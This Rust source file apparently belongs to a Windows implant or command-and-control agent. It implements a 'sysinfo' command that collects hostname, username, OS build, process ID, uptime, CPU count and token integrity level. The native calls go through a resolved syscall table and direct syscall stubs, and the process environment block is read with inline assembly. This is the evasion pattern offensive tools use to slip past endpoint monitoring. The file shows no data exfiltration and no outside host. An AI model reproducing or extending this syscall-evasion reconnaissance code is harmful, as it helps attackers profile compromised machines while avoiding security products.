use std::ffi::c_void;

use crate::core::{invoke, ssn_table};

fn wide_to_string(wide: &[u16]) -> String {
    let mut s = String::with_capacity(wide.len());
    for &c in wide {
        if c == 0 {
            break
        }
        s.push(if c < 128 {
            c as u8 as char
        } else {
            '?'
        });
    };
    s
}

pub unsafe fn cmd_sysinfo() -> Result<String, String> {
    let table = ssn_table::syscall_table();
    let mut output = String::with_capacity(512);

    // Hostname
    let hostname = if !table.win32.get_computer_name_ex_w.is_null() {
        type FnGetComputerNameExW = unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32;
        let func: FnGetComputerNameExW = core::mem::transmute(table.win32.get_computer_name_ex_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(3, buf.as_mut_ptr(), &mut size) != 0 {
            wide_to_string(&buf[..size as usize])
        } else {
            String::from("unknown")
        }
    } else {
        String::from("unknown")
    };

    // Username
    let username = if !table.win32.get_user_name_w.is_null() {
        type FnGetUserNameW = unsafe extern "system" fn(*mut u16, *mut u32) -> i32;
        let func: FnGetUserNameW = core::mem::transmute(table.win32.get_user_name_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(buf.as_mut_ptr(), &mut size) != 0 && size > 1 {
            wide_to_string(&buf[..size as usize - 1])
        } else {
            String::from("unknown")
        }
    }  else {
        String::from("unknown")
    };

    // OS version
    let mut os_info = crate::core::types::OsVersionInfoExW {
        os_version_info_size: core::mem::size_of::<crate::core::types::OsVersionInfoExW>() as u32,
        major_version: 0,
        minor_version: 0,
        build_number: 0,
        platform_id: 0,
        csd_version: [0u16; 128],
        service_pack_major: 0,
        service_pack_minor: 0,
        suite_mask: 0,
        product_type: 0,
        reserved: 0
    };
    if !table.win32.rtl_get_version.is_null() {
        crate::core::win32::rtl_get_version(&mut os_info);
    }
    // PID from TEB
    let teb: u64;
    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
    let pid = *((teb + 0x40) as *const u64) as u32;

    // Uptime from KUSER_SHARED_DATA
    let kuser = 0x7FFE0000usize as *const u8;
    let interrupt_low = *(kuser.add(0x08) as *const u32) as u64;
    let interrupt_high = *(kuser.add(0x0C) as *const u32) as u64;
    let uptime_ms = ((interrupt_high << 32) | interrupt_low) / 10000;
    let uptime_hours = uptime_ms / 3600000;
    let uptime_mins = (uptime_ms % 3600000) / 60000;

    // CPU cores via NtQuerySystemInformation(SystemBasicInformation)
    let cores = {
        let mut info = core::mem::MaybeUninit::<[u8; 64]>::zeroed();
        let mut rlen: u32 = 0;
        let st = invoke::syscall4(
            table.ssns.nt_query_system_information.ssn, 
            table.ssns.nt_query_system_information.syscall_addr as usize, 
            0, 
            info.as_mut_ptr() as usize, 
            64, 
            &mut rlen as *mut u32 as usize
        );
        if st == 0 {
            let buf = info.assume_init();
            buf[0x38] as u32 // NumberOfProcessors at offset 0x38 on x64
        } else {
            0u32
        }
    };

    let integrity = query_integrity(); 
    
    output.push_str(&alloc::format!("  Hostname   : {}\n", hostname));
    output.push_str(&alloc::format!("  Username   : {}\n", username));
    output.push_str(&alloc::format!("  OS         : Windows {}.{} Build {}\n", os_info.major_version, os_info.minor_version, os_info.build_number));
    output.push_str(&alloc::format!("  PID        : {}\n", pid));
    output.push_str(&alloc::format!("  Arch       : x64\n"));
    output.push_str(&alloc::format!("  Integrity  : {}\n", integrity));
    output.push_str(&alloc::format!("  Cores      : {}\n", cores));
    output.push_str(&alloc::format!("  Uptime     : {}h {}m\n", uptime_hours, uptime_mins));

    Ok(output)
}

unsafe fn query_integrity() -> &'static str {
    let table = ssn_table::syscall_table();
    if table.ssns.nt_open_process_token.ssn == 0 || table.ssns.nt_query_information_token.ssn == 0 {
        return "unknown"
    }

    let mut token_handle: *mut c_void = core::ptr::null_mut();
    let current_process = -1isize as *mut c_void;

    let status = invoke::syscall3(
        table.ssns.nt_open_process_token.ssn, 
        table.ssns.nt_open_process_token.syscall_addr as usize,
        current_process as usize,
        0x0008, // TOKEN_QUERY
        &mut token_handle as *mut _ as usize,
    );

    if status != 0 || token_handle.is_null() {
        return "unknown";
    }

    let mut buf = [0u8; 64];
    let mut return_len: u32 = 0;
    let status = invoke::syscall5(
        table.ssns.nt_query_information_token.ssn,
        table.ssns.nt_query_information_token.syscall_addr as usize,
        token_handle as usize,
        25, // TokenIntegrityLevel
        buf.as_mut_ptr() as usize,
        64,
        &mut return_len as *mut u32 as usize,
    );


    if status != 0 {
        return "unknown"
    }

    let sid_ptr = *(buf.as_ptr() as *const *const u8);
    if sid_ptr.is_null() {
        return "unknown";
    }

    let sub_auth_count = *sid_ptr.add(1) as usize;
    if sub_auth_count == 0 { return "unknown" }
    let rid_offset = 8 + (sub_auth_count - 1) * 4;
    let rid = *(sid_ptr.add(rid_offset) as *const u32);

    match rid {
        0x0000..=0x0FFF => "untrusted",
        0x1000..=0x1FFF => "low",
        0x2000..=0x2FFF => "medium",
        0x3000..=0x3FFF => "high",
        0x4000..        => "system",
    }
}